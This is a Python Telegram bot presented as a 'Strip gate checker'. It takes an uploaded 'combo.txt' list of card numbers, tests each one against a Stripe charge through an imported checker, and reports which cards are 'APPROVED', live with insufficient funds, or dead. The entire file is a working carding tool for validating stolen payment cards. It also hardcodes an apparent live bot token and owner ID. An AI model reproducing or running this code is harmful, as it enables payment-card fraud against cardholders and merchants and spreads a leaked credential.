import requests,re
try:
    import telebot
except:
    import os
    os.system("pip install pyTelegramBotAPI")
from telebot import *
from str1 import Tele
from colorama import Fore
sto = {"stop":False}
token = "6848019028:AAGDVZ4MIlMKOL0pRjtjMOadz4qkf9cqarU" #توكنك
id =6309252183  #ايديك
bot=telebot.TeleBot(token,parse_mode="HTML")
@bot.message_handler(commands=["start"])
def start(message):
 bot.send_message(message.chat.id,"welcome to Strip gate checker".format(message.chat.first_name),reply_markup=telebot.types.InlineKeyboardMarkup())
 
 @bot.message_handler(commands=["stop"])
 def start(message):
    sto.update({"stop":True})
    bot.reply_to(message,'#－ تم ايقاف البوت ')
    
@bot.message_handler(content_types=["document"])
def main(message):
 bad=0
 nok=0
 ok = 0
 res=0
 ko = (bot.reply_to(message,"#waiting for hits😋💸").message_id)
 ee=bot.download_file(bot.get_file(message.document.file_id).file_path)
 with open("combo.txt","wb") as w:
     w.write(ee)
 print(message.chat.id)
 sto.update({"stop":False})
 if message.chat.id == id:
   with open("combo.txt") as file:
       lino = file.readlines()
       lino = [line.rstrip() for line in lino]
       total = len(lino)
       for cc in lino:
           if sto["stop"] == False:
               pass
           else:
               break
           mes = types.InlineKeyboardMarkup(row_width=1)
           lucifer1 = types.InlineKeyboardButton(f"• {cc} •",callback_data='u8')
          # res = types.InlineKeyboardButton(f"[ {last} ]",callback_data='u1')
           lucifer2 = types.InlineKeyboardButton(f"• Charge 💸 : [ {ok} ] •",callback_data='u2')
           lucifer3 = types.InlineKeyboardButton(f"• Inf fund ✅ : [ {nok} ] •",callback_data='u2')
           lucifer4 = types.InlineKeyboardButton(f"• Ded⛔️ : [ {bad} ] •",callback_data='u1')
           lucifer5 = types.InlineKeyboardButton(f"• Total :) [ {total} ] •",callback_data='u1')
           mes.add(lucifer1,lucifer2,lucifer3,lucifer4,lucifer5)
           bot.edit_message_text(chat_id=message.chat.id,message_id=ko,text='''Dev @T_X_7 👽💸
    ''',parse_mode='markdown',reply_markup=mes)
           
           try:
             last = str(Tele(cc))
           except Exception as e:
               print(e)
               try:
                  last = str(Tele(cc))
               except Exception as e:
                  print(e)
                  bot.reply_to(message,f"حدث خطأ اثناء فحص هذه البطاقه وتم تخطيها {cc}")
                  last = "Your card was declined."
           if "taha" in last:
               bot.reply_to(message,"- Dont Check Again , Limit Reched Contact @T_X_7 To Update ✅")
               return
           elif "Expired Card" in last or "Cannot Authorize at this time (Policy)" in last or "closed card" in last or "Declined - Call Issuer" in last or "Cardholder's Activity Limit Exceeded" in last:
               bad +=1
               print(Fore.YELLOW+cc+"->"+Fore.RED+last)
               
           elif "succeeded" in last:
               ok +=1
               respo = f'''
｢APPROVED ✅ 」  

➜ 𝚌𝚌 : {cc}
➜ Gate : 𝑠𝑡𝑟𝑖𝑝𝑒 𝑎𝑢𝑡ℎ 
➜ Response : {last} ✅
➜ 𝙳𝚎𝚟 : @T_X_7'''
               print(Fore.YELLOW+cc+"->"+Fore.GREEN+last)
               bot.reply_to(message,respo)
           elif "Your card has insufficient funds." in last:
               nok += 1
               respo = f'''
｢APPROVED ✅ 」  

💳 𝚌𝚌 : {cc}
➜ Gate : Stripe (12$)
➜ Response : {last} ✅
➜ 𝙳𝚎𝚟 : @T_X_7'''
               print(Fore.YELLOW+cc+"->"+Fore.GREEN+last)
               bot.reply_to(message,respo)
           else:
                   bad +=1
                   print(Fore.YELLOW+cc+"->"+Fore.GREEN+last)
       if sto["stop"] == False:
           bot.reply_to(message,'#－ 𝖯𝗋𝗈𝖼𝖼𝖾𝗌𝗌 𝖧𝖺𝗌 𝖡𝖾𝖾𝗇 𝖢𝗈𝗆𝗉𝗅𝖾𝗍𝖾 ✅.')
 else:
     bot.reply_to(message,'#- Sorry This Not 4U ~ 🇪🇬⃝⃤𓆩𝗧𝗔𝗛𝗔𓆪')
       
print("STARTED -> @T_X_7 ✅🏴‍☠️")
bot.polling()
